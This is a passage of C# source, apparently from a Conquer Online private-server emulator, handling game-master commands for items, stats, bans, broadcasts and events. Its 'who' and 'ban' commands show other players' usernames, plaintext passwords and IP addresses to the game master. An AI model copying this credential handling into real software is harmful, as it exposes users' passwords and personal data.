                                                    Client.Entity.Counteraction = int.Parse(Data[3]);
                                                    break;
                                                case "pent":
                                                    Client.Entity.Penetration = int.Parse(Data[3]);
                                                    break;
                                                case "immu":
                                                    Client.Entity.Immunity = int.Parse(Data[3]);
                                                    break;
                                                case "minattack":
                                                    Client.Entity.MinAttack = uint.Parse(Data[3]);
                                                    break;
                                                case "maxattack":
                                                    Client.Entity.MaxAttack = uint.Parse(Data[3]);
                                                    break;
                                                case "mattack1":
                                                    Client.Entity.MagicAttack = uint.Parse(Data[3]);
                                                    break;
                                                case "mdef1":
                                                    Client.Entity.MagicDefence = ushort.Parse(Data[3]);
                                                    break;
                                                case "mattck":
                                                    Client.Entity.MagicDamageIncrease = ushort.Parse(Data[3]);
                                                    break;
                                                case "dodge":
                                                    Client.Entity.Dodge = byte.Parse(Data[3]);
                                                    break;
                                                case "prof":
                                                    Client.AddProficiency(new Proficiency(true) { ID = ushort.Parse(Data[3]) });
                                                    break;

                                                case "plustone":
                                                    {
                                                        UInt32 ItemId = UInt32.Parse(Data[3]);
                                                        if (Database.ConquerItemInformation.BaseInformations.ContainsKey(ItemId))
                                                        {
                                                            Database.ConquerItemBaseInformation iteminfo;
                                                            if (Database.ConquerItemInformation.BaseInformations.TryGetValue(ItemId, out iteminfo))
                                                            {
                                                                ConquerItem newItem = new GamePackets.ConquerItem(true);
                                                                newItem.ID = iteminfo.ID;
                                                                Byte Plus = (Byte)(newItem.ID % 730000);
                                                                Console.WriteLine("Item Plus " + Plus);
                                                                newItem.Plus = (Byte)(newItem.ID % 730000);
                                                                Client.Inventory.Add(newItem, Game.Enums.ItemUse.CreateAndAdd);
                                                            }
                                                        }
                                                        break;
                                                    }
                                                case "equip":
                                                    {
                                                        string ItemName = Data[3].ToLower();
                                                        Game.Enums.ItemQuality Quality = Game.Enums.ItemQuality.NormalV3;
                                                        Database.ConquerItemBaseInformation CIBI = null;
                                                        foreach (Database.ConquerItemBaseInformation infos in Database.ConquerItemInformation.BaseInformations.Values)
                                                        {
                                                            if (infos.LowerName == ItemName && Quality == (Game.Enums.ItemQuality)(infos.ID % 10))
                                                            {
                                                                CIBI = infos;
                                                            }
                                                        }
                                                        if (CIBI == null)
                                                            break;
                                                        ConquerItem newItem = new GamePackets.ConquerItem(true);
                                                        newItem.ID = CIBI.ID;
                                                        newItem.Position = 9;
                                                        newItem.Durability = CIBI.Durability;
                                                        newItem.MaximDurability = CIBI.Durability;
                                                        newItem.Color = (MTA.Game.Enums.Color)Kernel.Random.Next(4, 8);
                                                        Client.Equipment.Add(newItem, Game.Enums.ItemUse.CreateAndAdd);
                                                        break;
                                                    }
                                                case "unequip":
                                                    {
                                                        foreach (var item in Client.Equipment.Objects)
                                                        {
                                                            Client.Equipment.Remove((byte)item.Position);
                                                            Database.ConquerItemTable.DeleteItem(item.ID);
                                                        }
                                                        break;
                                                    }
                                            }
                                            break;
                                        }
                                    }
                                    break;
                                }
                            case "open":
                                {
                                    GamePackets.Data data = new GamePackets.Data(true);
                                    data.ID = GamePackets.Data.OpenCustom;
                                    data.UID = client.Entity.UID;
                                    data.TimeStamp = Time32.Now;
                                    data.dwParam = uint.Parse(Data[1]);
                                    data.wParam1 = client.Entity.X;
                                    data.wParam2 = client.Entity.Y;
                                    client.Send(data);
                                    break;
                                }
                            case "who":
                                {
                                    var varr = Kernel.GamePool.Values.GetEnumerator();
                                    varr.MoveNext();
                                    int COunt = Kernel.GamePool.Count;
                                    for (uint x = 0;
                                        x < COunt;
                                        x++)
                                    {
                                        if (x >= COunt) break;

                                        Client.GameState pClient = (varr.Current as Client.GameState);

                                        if (pClient.Entity.Name.ToLower().Contains(Data[1]))
                                        {
                                            client.Send(new MTA.Network.GamePackets.Message("[Whois " + pClient.Entity.Name + "]", System.Drawing.Color.Gold, GamePackets.Message.FirstRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("Username: " + pClient.Account.Username, System.Drawing.Color.Gold, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("Password: " + pClient.Account.Password, System.Drawing.Color.Gold, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("IP: " + pClient.Account.IP, System.Drawing.Color.Gold, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("CPs: " + pClient.Entity.ConquerPoints, System.Drawing.Color.Gold, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("BoundCPs: " + pClient.Entity.BoundCps, System.Drawing.Color.Gold, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("Money: " + pClient.Entity.Money, System.Drawing.Color.Green, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("Class: " + pClient.Entity.Class, System.Drawing.Color.Green, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("UID: " + pClient.Entity.UID, System.Drawing.Color.Green, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("Level: " + pClient.Entity.Level, System.Drawing.Color.Green, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("Strength: " + pClient.Entity.Strength, System.Drawing.Color.Green, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("Agility: " + pClient.Entity.Agility, System.Drawing.Color.Green, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("Vitality: " + pClient.Entity.Vitality, System.Drawing.Color.Green, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("Spirit: " + pClient.Entity.Spirit, System.Drawing.Color.Green, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("Atributes: " + pClient.Entity.Atributes, System.Drawing.Color.Green, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("Hitpoints: " + pClient.Entity.Hitpoints, System.Drawing.Color.Green, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("PKPoints: " + pClient.Entity.PKPoints, System.Drawing.Color.Green, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("VIPLevel: " + pClient.Entity.VIPLevel, System.Drawing.Color.Green, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("Map: [" + pClient.Entity.MapID + "] " + pClient.Entity.X + "," + pClient.Entity.Y, System.Drawing.Color.Green, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("Frist RB: " + pClient.Entity.FirstRebornClass, System.Drawing.Color.Green, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("Sconed RB: " + pClient.Entity.SecondRebornClass, System.Drawing.Color.Green, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("FirstRebornLevel: " + pClient.Entity.FirstRebornLevel, System.Drawing.Color.Green, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("SecondRebornLevel: " + pClient.Entity.SecondRebornLevel, System.Drawing.Color.Green, GamePackets.Message.ContinueRightCorner));

                                        }

                                        varr.MoveNext();
                                    }
                                    break;
                                }
                            case "flash":
                                {
                                    var varr = Kernel.GamePool.Values.GetEnumerator();
                                    varr.MoveNext();
                                    int COunt = Kernel.GamePool.Count;
                                    for (uint x = 0;
                                        x < COunt;
                                        x++)
                                    {
                                        if (x >= COunt) break;

                                        Client.GameState Client = (varr.Current as Client.GameState);

                                        if (Client.Entity.Name.ToLower().Contains(Data[1]))
                                        {
                                            Client.Entity.AddFlag(Update.Flags.FlashingName);
                                            Client.Entity.FlashingNameStamp = Time32.Now;
                                            Client.Entity.FlashingNameTime = byte.Parse(Data[2]);
                                        }

                                        varr.MoveNext();
                                    }

                                    break;
                                }
                            case "testsinf":
                                {
                                    byte[] mazen = new byte[] { 0x2C, 0x00, 0x21, 0x27, 0x58, 0xD8, 0x3B, 0x09, 0x7D, 0x92, 0x54, 0x00, 0x01, 0x00, 0x00, 0x00, 0x19, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x54, 0x51, 0x53, 0x65, 0x72, 0x76, 0x65, 0x72 };
                                    Writer.WriteUInt32(client.Entity.UID, 8, mazen);
                                    Writer.WriteUInt32((uint)Time32.timeGetTime().GetHashCode(), 4, mazen);
                                    client.Send(mazen);
                                    client.SendScreen(mazen, true);
                                    break;
                                }
                            case "testsinf1":
                                {
                                    byte[] mazen = new byte[] { 0x2C, 0x00, 0x21, 0x27, 0x4E, 0x9E, 0x48, 0x09, 0x7D, 0x92, 0x54, 0x00, 0x01, 0x00, 0x00, 0x00, 0x19, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x54, 0x51, 0x53, 0x65, 0x72, 0x76, 0x65, 0x72 };
                                    Writer.WriteUInt32(client.Entity.UID, 8, mazen);
                                    Writer.WriteUInt32((uint)Time32.timeGetTime().GetHashCode(), 4, mazen);
                                    client.Send(mazen);
                                    client.SendScreen(mazen, true);
                                    break;
                                }
                            case "crossserver":
                                {
                                    switch (Data[1])
                                    {
                                        case "on":
                                            {
                                                if (Program.MainServer)
                                                {
                                                    if (!Game.CrossGuildWar.IsWar)
                                                    {
                                                        Game.CrossGuildWar.Start();
                                                    }
                                                }
                                                else
                                                {
                                                    Program.ServerTransfer = true;
                                                    Kernel.TransferdPlayers.Clear();
                                                    foreach (var c in Kernel.GamePool.Values)
                                                    {
                                                        c.MessageBox("Do You Want To Join Cross Server?", p =>
                                                        {
                                                            if (Program.ServerTransfer)
                                                            {
                                                                if (!Kernel.TransferdPlayers.Contains(p.Entity.UID))
                                                                    Kernel.TransferdPlayers.Add(p.Entity.UID);
                                                                p.Disconnect();
                                                            }

                                                        });
                                                    }
                                                }
                                                break;
                                            }
                                        case "off":
                                            {
                                                if (Program.MainServer)
                                                {
                                                    if (Game.CrossGuildWar.IsWar)
                                                    {
                                                        Game.CrossGuildWar.End();
                                                        foreach (var p in Program.Values)
                                                        {
                                                            if (p.TransferedPlayer)
                                                                p.Disconnect();
                                                        }
                                                    }
                                                }
                                                else
                                                {
                                                    Program.ServerTransfer = false;
                                                    Kernel.TransferdPlayers.Clear();
                                                }
                                                break;
                                            }
                                    }
                                    break;
                                }
                            case "addrem":
                                {
                                    int flagtype = int.Parse(Data[1]);
                                    ulong addFlag = 1UL << int.Parse(Data[2]);
                                    ulong remFlag = 1UL << int.Parse(Data[3]);
                                    if (flagtype == 1)
                                    {
                                        client.Entity.AddFlag(addFlag);
                                        client.Entity.RemoveFlag(remFlag);
                                    }
                                    else if (flagtype == 2)
                                    {
                                        client.Entity.AddFlag2(addFlag);
                                        client.Entity.RemoveFlag2(remFlag);
                                    }
                                    else
                                    {
                                        client.Entity.AddFlag3((uint)addFlag);
                                        client.Entity.RemoveFlag3((uint)remFlag);
                                    }
                                    break;
                                }
                            case "reloadmobs":
                                {
                                    client.Map.FreezeMonsters = true;
                                    var Clone = client.Map.Entities.Values.ToArray();
                                    foreach (var mob in Clone)
                                        if (!mob.Companion)
                                        {
                                            client.Map.Floor[mob.X, mob.Y, MTA.Game.MapObjectType.Monster, mob] = true;
                                            client.Map.Entities.Remove(mob.UID);
                                        }
                                    Clone = new Game.Entity[0];
                                    client.Map.EntityUIDCounter.Now = 400000;
                                    client.Map.LoadMonsters();
                                    client.Map.FreezeMonsters = false;
                                    foreach (Client.GameState Client in Program.Values)
                                    {
                                        if (Client.Map.ID == client.Map.ID)
                                        {
                                            Client.Entity.Teleport(Client.Entity.MapID, Client.Entity.X, Client.Entity.Y);
                                        }
                                    }
                                    break;
                                }
                            case "mobmesh":
                                {
                                    client.Entity.Body = ushort.Parse(Data[1]);
                                    break;
                                }
                            case "find":
                                {
                                    foreach (var pClient in Program.Values)
                                    {
                                        string name = pClient.Entity.LoweredName;
                                        if (name.Contains(Data[1]))
                                        {
                                            client.Entity.Teleport(pClient.Entity.MapID, pClient.Entity.X, pClient.Entity.Y);
                                        }
                                    }
                                    break;
                                }
                            case "restart":
                                {
                                    Program.CommandsAI("@restart");
                                    break;
                                }
                            case "save":
                                {
                                    Program.CommandsAI("@save");
                                    break;
                                }
                            case "exit":
                                {
                                    Program.CommandsAI("@exit");
                                    break;
                                }
                            case "kick":
                                {
                                    foreach (var Client in Program.Values)
                                    {
                                        if (Client.Entity.LoweredName.Contains(Data[1]))
                                        {
                                            Client.Disconnect();
                                            break;
                                        }
                                    }
                                    break;
                                }
                            case "testspell":
                                {
                                    SpellUse suse = new SpellUse(true);
                                    suse.Attacker = client.Entity.UID;
                                    suse.SpellID = ushort.Parse(Data[1]);
                                    suse.X = client.Entity.X;
                                    suse.Y = client.Entity.Y;
                                    suse.Targets.Add(client.Entity.UID, 1);
                                    client.Entity.Owner.SendScreen(suse, true);
                                    break;
                                }
                            case "ban":
                                {
                                    foreach (var Client in Program.Values)
                                    {
                                        if (Client.Account.State >= client.Account.State)
                                            continue;
                                        if (Client.Entity.LoweredName.Contains(Data[1]))
                                        {
                                            Client.Account.State = Database.AccountTable.AccountState.Banned;
                                            Client.Account.SaveState();
                                            Client.Account.MatrixState(Database.AccountTable.AccountState.Banned);

                                            //       Client["banhours"] = Data[2].Cast<int>();
                                            //        Client["banreason"] = message_.Substring(Data[0].Length + 1 + Data[1].Length + 1 + Data[2].Length + 1);
                                            //       Client["banstamp"] = DateTime.Now;

                                            Client.Disconnect();
                                            Kernel.SendWorldMessage(new Message(client.Account.State.ToString() + " " + client.Entity.Name + " has banned the player " + Client.Entity.Name, GamePackets.Message.Center));
                                            client.Send(new MTA.Network.GamePackets.Message("[Name " + Client.Entity.Name + "]", System.Drawing.Color.Gold, GamePackets.Message.FirstRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("Username: " + Client.Account.Username, System.Drawing.Color.Gold, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("Password: " + Client.Account.Password, System.Drawing.Color.Gold, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("IP: " + Client.Account.IP, System.Drawing.Color.Gold, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("CPs: " + Client.Entity.ConquerPoints, System.Drawing.Color.Gold, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("Money: " + Client.Entity.Money, System.Drawing.Color.Green, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("Map: [" + Client.Entity.MapID + "] " + Client.Entity.X + "," + Client.Entity.Y, System.Drawing.Color.Green, GamePackets.Message.ContinueRightCorner));
                                            break;
                                        }
                                    }
                                    break;
                                }
                            case "unban":
                                {
                                    var Account = new Database.AccountTable(Data[1]);
                                    if (Account.State == MTA.Database.AccountTable.AccountState.Banned)
                                    {
                                        Account.State = MTA.Database.AccountTable.AccountState.Player;
                                        Account.SaveState();
                                        //Account.Savekimo();
                                    }
                                    break;
                                }
                            #region all poles
                            case "phopole":
                                {
                                    switch (Data[1])
                                    {
                                        case "on":
                                            PolePhoenix.Start();
                                            foreach (var cclient in Program.Values)
                                                cclient.MessageBox("PolePhoenix has begun! Would you like to join?",
                                                       p => { p.Entity.Teleport(1002, 371, 331); }, null); break;
                                        case "off": PolePhoenix.End(); break;
                                    }
                                    break;
                                }
                            case "decpole":
                                {
                                    switch (Data[1])
                                    {
                                        case "on":
                                            DecPole.Start();
                                            foreach (var cclient in Program.Values)
                                                cclient.MessageBox("DecPole has begun! Would you like to join?",
                                                       p => { p.Entity.Teleport(1002, 352, 252); }, null); break;
                                        case "off": DecPole.End(); break;
                                    }
                                    break;
                                }
                            case "apepole":
                                {
                                    switch (Data[1])
                                    {
                                        case "on":
                                            ApePole.Start();
                                            foreach (var cclient in Program.Values)
                                                cclient.MessageBox("ApePole has begun! Would you like to join?",
                                                       p => { p.Entity.Teleport(1002, 348, 252); }, null); break;
                                        case "off": ApePole.End(); break;
                                    }
                                    break;
                                }
                            case "twipole":
                                {
                                    switch (Data[1])
                                    {
                                        case "on":
                                            PoleTwin.Start();
                                            foreach (var cclient in Program.Values)
                                                cclient.MessageBox("PoleTwin has begun! Would you like to join?",
                                                      p => { p.Entity.Teleport(1002, 257, 242); }, null); break;
                                        case "off": PoleTwin.End(); break;
                                    }
                                    break;
                                }
                            case "birpole":
                                {
                                    switch (Data[1])
                                    {
                                        case "on":
                                            PoleIslanD.Start();
                                            foreach (var cclient in Program.Values)
                                                cclient.MessageBox("PoleIslanD has begun! Would you like to join?",
                                                       p => { p.Entity.Teleport(1002, 368, 331); }, null); break;
                                        case "off": PoleIslanD.End(); break;
                                    }
                                    break;
                                }
                            #endregion
                            case "banip":
                                {
                                    string bannedIP = "";
                                    foreach (var Client in Program.Values)
                                    {
                                        if (Client.Account.State >= client.Account.State)
                                            continue;
                                        if (Client.Entity.LoweredName.Contains(Data[1]))
                                        {
                                            bannedIP = Client.Account.IP;
                                            Client.Account.State = Database.AccountTable.AccountState.Banned;
                                            Client.Account.SaveState();
                                            Database.IPBan.Ban(Client.Account.IP);
                                            Client.Disconnect();
                                            break;
                                        }
                                    }
                                    if (bannedIP == "")
                                        Kernel.SendWorldMessage(new Message(client.Account.State.ToString() + " " + client.Entity.Name + " has banned the IP: " + bannedIP, GamePackets.Message.Center));
                                    foreach (var Client in Program.Values)
                                    {
                                        if (Client.Account.State >= client.Account.State)
                                            continue;
                                        if (Client.Account.IP == bannedIP)
                                        {
                                            Client.Account.State = Database.AccountTable.AccountState.Banned;
                                            Client.Account.SaveState();
                                            Client.Disconnect();
                                        }
                                    }
                                    break;
                                }
                            case "unbanip":
                                {
                                    Database.IPBan.Unban(Data[1]);
                                    break;
                                }
                            case "chatban":
                                {
                                    foreach (var Client in Program.Values)
                                    {
                                        if (Client.Entity.Name.Contains(Data[1]))
                                        {
                                            Client.ChatBanLasts = uint.Parse(Data[2]);
                                            Client.ChatBanTime = DateTime.Now;
                                            Client.ChatBanned = true;
                                        }
                                    }
                                    break;
                                }
                            case "increaseexp":
                                {
                                    client.IncreaseExperience(ulong.Parse(Data[1]), true);
                                    break;
                                }
                            case "chatunban":
                                {
                                    foreach (var Client in Program.Values)
                                    {
                                        if (Client.Entity.Name.Contains(Data[1]))
                                        {
                                            Client.ChatBanned = false;
                                        }
                                    }
                                    break;
                                }
                            case "bc":
                                {
                                    Game.ConquerStructures.Broadcast.Broadcasts.Clear();
                                    Game.ConquerStructures.Broadcast.BroadcastStr broadcast = new MTA.Game.ConquerStructures.Broadcast.BroadcastStr();
                                    broadcast.EntityID = client.Entity.UID;
                                    broadcast.EntityName = client.Entity.Name;
                                    broadcast.ID = Game.ConquerStructures.Broadcast.BroadcastCounter.Next;
                                    broadcast.Message = message_.Remove(0, 2);
                                    Kernel.SendWorldMessage(new Message(message_.Remove(0, 2), "ALLUSERS", client.Entity.Name, System.Drawing.Color.Red, GamePackets.Message.BroadcastMessage), Program.Values);
                                    Game.ConquerStructures.Broadcast.CurrentBroadcast.EntityID = 1;
                                    Game.ConquerStructures.Broadcast.CurrentBroadcast = broadcast;
                                    break;
                                }
                            case "broadcast":
                                {
                                    Game.ConquerStructures.Broadcast.Broadcasts.Clear();
                                    Game.ConquerStructures.Broadcast.BroadcastStr broadcast = new MTA.Game.ConquerStructures.Broadcast.BroadcastStr();
                                    broadcast.EntityID = client.Entity.UID;
                                    broadcast.EntityName = client.Entity.Name;
                                    broadcast.ID = Game.ConquerStructures.Broadcast.BroadcastCounter.Next;
                                    broadcast.Message = message_.Remove(0, 9);
                                    Kernel.SendWorldMessage(new Message(message_.Remove(0, 9), "ALLUSERS", client.Entity.Name, System.Drawing.Color.Red, GamePackets.Message.BroadcastMessage), Program.Values);
                                    Game.ConquerStructures.Broadcast.CurrentBroadcast.EntityID = 1;
                                    Game.ConquerStructures.Broadcast.CurrentBroadcast = broadcast;
                                    break;
                                }
                            case "ann":
                                {
                                    Kernel.SendWorldMessage(new Message("[Franko] By " + client.Entity.Name + ": " + Mess.Remove(0, 3), System.Drawing.Color.Red, Network.GamePackets.Message.Center), Program.Values);
                                    Kernel.SendWorldMessage(new Message("[Franko] By " + client.Entity.Name + ": " + Mess.Remove(0, 3), System.Drawing.Color.Red, Network.GamePackets.Message.World), Program.Values);
                                    break;
                                }
                            case "announce":
                                {
                                    Kernel.SendWorldMessage(new Message("[Franko] By " + client.Entity.Name + ": " + Mess.Remove(0, 8), System.Drawing.Color.Red, Network.GamePackets.Message.Center), Program.Values);
                                    Kernel.SendWorldMessage(new Message("[Franko] By " + client.Entity.Name + ": " + Mess.Remove(0, 8), System.Drawing.Color.Red, Network.GamePackets.Message.World), Program.Values);
                                    break;
                                }
                            case "arenapoints":
                                {
                                    client.ArenaStatistic.ArenaPoints = uint.Parse(Data[1]);
                                    client.ArenaStatistic.Send(client);
                                    break;
                                }
                            case "quiz":
                                {
                                    Kernel.QuizShow.Start();
                                    break;
                                }
                            case "record":
                                {
                                    if (client.Account.State != Database.AccountTable.AccountState.GM)
                                        break;
                                    switch (Data[1])
                                    {
                                        case "on": client.Entity.Mode = Game.Enums.Mode.Recording; break;
                                        case "off": Program.CommandsAI("/saverecord"); break;
                                    }
                                    break;
                                }
                            case "online":
                                {
                                    client.Send(new Message("Online Players Count: " + Kernel.GamePool.Count, System.Drawing.Color.BurlyWood, GamePackets.Message.TopLeft));
                                    string line = "";
                                    foreach (Client.GameState pClient in Program.Values)
                                        line += pClient.Entity.Name + ",";

                                    if (line.Length >= 255)
                                        return true;
                                    client.Send(new GamePackets.Message(line, System.Drawing.Color.Beige, GamePackets.Message.Talk));
                                    break;
                                }
                            case "egw":
                                {
                                    if (Game.EliteGuildWar.IsWar)
                                    {
                                        Game.EliteGuildWar.IsWar = false;
                                        Kernel.SendWorldMessage(new Message("EliteGuild War is off!", Color.Red, 2011), Program.Values);
                                    }
                                    else
                                    {

                                        Game.EliteGuildWar.IsWar = true;
                                        Kernel.SendWorldMessage(new Message("Eliteguild War is on!", Color.Red, 2011), Program.Values);
                                    }
                                    break;
                                }
                            case "prof":
                                {
                                    Interfaces.IProf proficiency = new GamePackets.Proficiency(true);
                                    if (Data.Length > 1)
                                        proficiency.ID = ushort.Parse(Data[1]);
                                    if (Data.Length > 2)
                                        proficiency.Level = byte.Parse(Data[2]);
                                    if (Data.Length > 3)
                                        proficiency.Experience = uint.Parse(Data[3]);
                                    client.AddProficiency(proficiency);
                                    break;
                                }
                            case "class":
                                {
                                    byte _class = client.Entity.Class;
                                    byte.TryParse(Data[1], out _class);
                                    _class = Math.Min((byte)165, Math.Max((byte)1, _class));
                                    client.Entity.Class = _class;
                                    if (client.Entity.Reborn == 0)
                                    {
                                        Database.DataHolder.GetStats(_class, client.Entity.Level, client);
                                        client.CalculateStatBonus();
                                        client.CalculateHPBonus();
                                        client.GemAlgorithm();
                                    }
                                    break;
                                }
                            case "body":
                                {
                                    ushort body = client.Entity.Body;
                                    ushort.TryParse(Data[1], out body);
                                    if (body != 2001 && body != 2002 && body != 1003 && body != 1004)
                                        return true;
                                    byte realgender = (byte)(client.Entity.Body % 10);
                                    byte gender = (byte)(body % 10);
                                    if (client.Equipment.Objects[8] != null)
                                        if (gender >= 3 && realgender <= 2)
                                            return true;
                                    client.Entity.Body = body;
                                    if (gender >= 3 && realgender <= 2)
                                        client.Entity.Face -= 200;
                                    if (gender <= 2 && realgender >= 3)
                                        client.Entity.Face += 200;
                                    break;
                                }
                            case "hair":
                                {
                                    ushort hair = client.Entity.HairStyle;
                                    ushort.TryParse(Data[1], out hair);
                                    client.Entity.HairStyle = hair;
                                    break;
                                }
                            case "transform":
                                {
                                    if (client.Entity.Dead)
                                        break;
                                    bool wasTransformated = client.Entity.Transformed;
                                    if (wasTransformated)
                                    {
                                        client.Entity.Hitpoints = client.Entity.MaxHitpoints;
                                        client.Entity.TransformationID = 0;
                                        client.Entity.TransformationStamp = Time32.Now;
                                        return true;
                                    }
                                    ushort transformation = client.Entity.TransformationID;
                                    ushort.TryParse(Data[1], out transformation);
                                    client.Entity.TransformationID = transformation;
                                    client.Entity.TransformationStamp = Time32.Now;
                                    client.Entity.TransformationTime = 110;
                                    SpellUse spellUse = new SpellUse(true);
                                    spellUse.Attacker = client.Entity.UID;
                                    spellUse.SpellID = 1360;
                                    spellUse.SpellLevel = 4;
                                    spellUse.X = client.Entity.X;
                                    spellUse.Y = client.Entity.Y;
                                    spellUse.AddTarget(client.Entity, (uint)0, null);
                                    client.Send(spellUse);
                                    client.Entity.TransformationMaxHP = 3000;
                                    double maxHP = client.Entity.MaxHitpoints;
                                    double HP = client.Entity.Hitpoints;
                                    double point = HP / maxHP;

                                    client.Entity.Hitpoints = (uint)(client.Entity.TransformationMaxHP * point);
                                    client.Entity.Update(Update.MaxHitpoints, client.Entity.TransformationMaxHP, false);
                                    break;
                                }
                            case "item3":
                                {
                                    ConquerItem newItem = new GamePackets.ConquerItem(true);
                                    newItem.ID = uint.Parse(Data[1]);
                                    Database.ConquerItemBaseInformation CIBI = null;
                                    CIBI = Database.ConquerItemInformation.BaseInformations[newItem.ID];
                                    if (CIBI == null)
                                        break;
                                    newItem.Durability = CIBI.Durability;
                                    newItem.MaximDurability = CIBI.Durability;
                                    if (Data.Length > 2)
                                    {
                                        byte plus = 0;
                                        byte.TryParse(Data[2], out plus);
                                        newItem.Plus = Math.Min((byte)12, plus);
                                        if (Data.Length > 3)
                                        {
                                            byte bless = 0;
                                            byte.TryParse(Data[3], out bless);
                                            newItem.Bless = Math.Min((byte)7, bless);
                                            if (Data.Length > 4)
                                            {
                                                byte ench = 0;
                                                byte.TryParse(Data[4], out ench);
                                                newItem.Enchant = Math.Min((byte)255, ench);
                                                if (Data.Length > 5)
                                                {
                                                    byte soc1 = 0;
                                                    byte.TryParse(Data[5], out soc1);
                                                    if (Enum.IsDefined(typeof(Game.Enums.Gem), soc1))
                                                    {
                                                        newItem.SocketOne = (Game.Enums.Gem)soc1;
                                                    }
                                                    if (Data.Length > 6)
                                                    {
                                                        byte soc2 = 0;
                                                        byte.TryParse(Data[6], out soc2);
                                                        if (Enum.IsDefined(typeof(Game.Enums.Gem), soc2))
                                                        {
                                                            newItem.SocketTwo = (Game.Enums.Gem)soc2;
                                                        }
                                                        if (Data.Length > 7)
                                                        {
                                                            byte eff = 0;
                                                            byte.TryParse(Data[7], out eff);
                                                            if (Enum.IsDefined(typeof(Game.Enums.ItemEffect), eff))
                                                            {
                                                                newItem.Effect = (Game.Enums.ItemEffect)eff;
                                                            }
                                                        }
                                                    }

                                                }
                                            }
                                        }
                                    }
                                    newItem.Color = (MTA.Game.Enums.Color)Kernel.Random.Next(4, 8);
                                    client.Inventory.Add(newItem, Game.Enums.ItemUse.CreateAndAdd);
                                    break;
                                }
                            case "item2":
                                {
                                    ConquerItem newItem = new GamePackets.ConquerItem(true);
                                    newItem.ID = uint.Parse(Data[1]);
                                    Database.ConquerItemBaseInformation CIBI = null;
                                    CIBI = Database.ConquerItemInformation.BaseInformations[newItem.ID];
                                    if (CIBI == null)
                                        break;
                                    newItem.Durability = CIBI.Durability;
                                    newItem.MaximDurability = CIBI.Durability;
                                    if (Data.Length > 2)
                                    {
                                        byte plus = 0;
                                        byte.TryParse(Data[2], out plus);
                                        newItem.Plus = Math.Min((byte)12, plus);
                                        if (Data.Length > 3)
                                        {
                                            byte bless = 0;
                                            byte.TryParse(Data[3], out bless);
                                            newItem.Bless = Math.Min((byte)7, bless);
                                            if (Data.Length > 4)
                                            {
                                                byte ench = 0;
                                                byte.TryParse(Data[4], out ench);
                                                newItem.Enchant = Math.Min((byte)255, ench);
                                                if (Data.Length > 5)
                                                {
                                                    byte soc1 = 0;
                                                    byte.TryParse(Data[5], out soc1);
                                                    if (Enum.IsDefined(typeof(Game.Enums.Gem), soc1))
                                                    {
                                                        newItem.SocketOne = (Game.Enums.Gem)soc1;
                                                    }
                                                    if (Data.Length > 6)
                                                    {
                                                        byte soc2 = 0;
                                                        byte.TryParse(Data[6], out soc2);
                                                        if (Enum.IsDefined(typeof(Game.Enums.Gem), soc2))
                                                        {
                                                            newItem.SocketTwo = (Game.Enums.Gem)soc2;
                                                        }
                                                    }
                                                    if (Data.Length > 9)
                                                    {
                                                        byte R = 0, G = 0, B = 0;
                                                        byte.TryParse(Data[7], out R);
                                                        byte.TryParse(Data[8], out G);
                                                        byte.TryParse(Data[9], out B);
                                                        newItem.SocketProgress = (uint)(B | (G << 8) | (R << 16));
                                                    }
                                                }
                                            }
                                        }
                                    }
                                    newItem.Color = (MTA.Game.Enums.Color)Kernel.Random.Next(4, 8);
                                    client.Inventory.Add(newItem, Game.Enums.ItemUse.CreateAndAdd);
                                    break;
                                }
                            #region  Chi
                            case "xmenchi":
                                {
                                    var Mode = int.Parse(Data[1]);
                                    var pos = (int)(int.Parse(Data[2]) - 1);
                                    var powers = client.ChiPowers[Mode - 1];
                                    var attributes = powers.Attributes;
                                    attributes[pos].Type = (Enums.ChiAttribute)ushort.Parse(Data[3]);
                                    attributes[pos].Value = (ushort)Game.Enums.ChiMaxValues(attributes[pos].Type);
